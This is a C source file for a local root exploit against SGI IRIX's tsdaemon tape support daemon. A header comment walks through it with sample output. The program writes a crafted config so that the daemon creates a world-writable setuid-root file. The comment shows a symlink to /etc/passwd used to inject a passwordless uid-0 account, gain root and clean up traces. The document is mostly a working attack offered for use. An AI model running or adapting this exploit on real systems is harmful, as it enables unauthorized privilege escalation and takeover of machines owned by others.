/* SGI IRIX <= 6.5.22 "tsdaemon" root arbitrary file creation exploit
 * ==================================================================
 * SGI IRIX contains a "tape support daemon" for working with tape drives
 * that by default can be accessed only by users in the "adm" group. It
 * is possible to influence a chown() and chmod() call on an arbitrary 
 * file with the name "daemon" or "daemon.stderr". The created file is
 * owned by "root" and group "sys" allowing for a privilege escalation
 * attack. You can learn more about the support daemon on "tsdaemon(1M)"
 * and the various options in its configuration file "ts.config(4)".
 *
 * This exploit takes a path and creates a world writeable setuid root
 * owned file in the path you supply.
 * 
 * e.g. 
 * $ ls -al /etc/daemon;id;uname -a;ls -al /usr/etc/ts/tsdaemon
 * Cannot access /etc/daemon: No such file or directory
 * uid=5(adm) gid=3(adm)
 * IRIX IRIS 6.5 10070055 IP22
 * -rwsr-s---    1 root     adm        65352 Dec 31  1999 /usr/etc/ts/tsdaemon
 * $ ./irix-tapex /etc
 * [ SGI IRIX <= 6.5.22 tsdaemon local root exploit
 * [ written 406 bytes of config for /etc/daemon
 * [ stopping any running tape daemon
 * [ file creation exploit tsdaemon /etc
 * [ launching tape daemon
 * [ wrote file
 * -rwsrwxrwx    1 root     sys          302 May  2 16:37 /etc/daemon []
 * $          
 *
 * If you want to use this exploit to get local root permissions, you can
 * overwrite existing files using a symlink. 
 *
 * e.g.
 * $ id
 * uid=5(adm) gid=3(adm)
 * $ ln -s /etc/passwd /tmp/daemon
 * $ cp /etc/passwd /tmp/backup
 * $ /tmp/irix-tapex /tmp
 * [ SGI IRIX <= 6.5.22 tsdaemon local root exploit
 * [ written 406 bytes of config for /tmp/daemon
 * [ stopping any running tape daemon
 * [ file creation exploit tsdaemon /tmp
 * [ launching tape daemon
 * [ wrote file
 * lrwxr-xr-x    1 5        adm           11 Mar 27 07:38 /tmp/daemon -> /etc/passwd []
 * $ echo r00t::0:0:evilhacker:/bin/csh >> /etc/passwd
 * $ su - r00t
 * # id
 * uid=0(r00t) gid=0(sys)
 * # cp /tmp/backup /etc/passwd
 * # chmod 444 /etc/passwd
 * # ls -al /etc/passwd
 * -r--r--r--    1 root     sys         1331 Mar 26 23:39 /etc/passwd
 * # rm -rf /tmp/config /tmp/backup /tmp/daemon
 *
 * Happy Hacking!
 * - Hacker Fantastic 
 *    (https://hacker.house)
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>

char* cconfig = "PERSONALITY\n"
                "        product = DLT8000 ,\n"
                "        binary = /usr/etc/ts/tsdlt7000\n\n"
                "OPTIONS\n"
                "trace_file_group_id             = 0 ,\n"
                "trace_file_mode                 = 04777 ,\n"
                "trace_file_owner                = 0 ,\n"
                "trace_directory                 = %s ,\n"
                "trace_state                     = ON ,\n"
                "trace_save_directory            = /tmp ,\n"
                "trace_file_size                 = 0 ,\n"
                "trace_type                      = LINEAR\n"; 

int main(int argc, char* argv[]){
        int fd;
        size_t out;
        pid_t pid;
        char* outbuffer, *truncbuffer;
        char* arg1p[]={"tsstop","-a",0};
        char* arg2p[]={"tsdaemon","-C","/tmp/config",0};
        char* arg3p[]={"ls","-alP",NULL,0};
        char* envp[]={"",0};
        printf("[ SGI IRIX <= 6.5.22 tsdaemon local root exploit\n");
        if(argc < 2){
                printf("[ error use with <output_path>\n");
                exit(0);
        }
        fd = open("/tmp/config",O_RDWR|O_CREAT,0700);
        if(fd==-1){
                printf("[ error writing config!\n");
                exit(0);
        }
        outbuffer = malloc(strlen(cconfig)+strlen(argv[1])+1);
        truncbuffer = malloc(strlen(argv[1])+strlen("/daemon")+1);
        if(!outbuffer||!truncbuffer){
                printf("p error in malloc()\n");
                exit(0);
        }
        memset(outbuffer,0,(strlen(cconfig)+strlen(argv[1])+1));
        memset(truncbuffer,0,(strlen(argv[1])+strlen("/daemon")+1));
        snprintf(outbuffer,(strlen(cconfig)+strlen(argv[1])),cconfig,argv[1]);
        snprintf(truncbuffer,(strlen(argv[1])+strlen("/daemon")+1),"%s/daemon",argv[1]);
        out = write(fd,outbuffer,(strlen(cconfig)+strlen(argv[1])-2));
        printf("[ written %d bytes of config for %s\n",out,truncbuffer);
        close(fd);
        arg3p[2] = truncbuffer;
        pid = fork();
        switch(pid){
                case 0:
                        printf("[ stopping any running tape daemon\n");
                        execve("/usr/etc/ts/tsstop",arg1p,envp);
                        break;
                default:
                        waitpid(pid,NULL,0);
                        printf("[ file creation exploit tsdaemon %s\n",argv[1]);
                        break;
        }
        pid = fork();
        switch(pid){
                case 0:
                        printf("[ launching tape daemon\n");
                        execve("/usr/etc/ts/tsdaemon",arg2p,envp);
                        break;
                default:
                        waitpid(pid,NULL,0);
                        sleep(1);
                        printf("[ wrote file\n");
                        break;
        }
        execve("/bin/ls",arg3p,envp);
        exit(0);
}
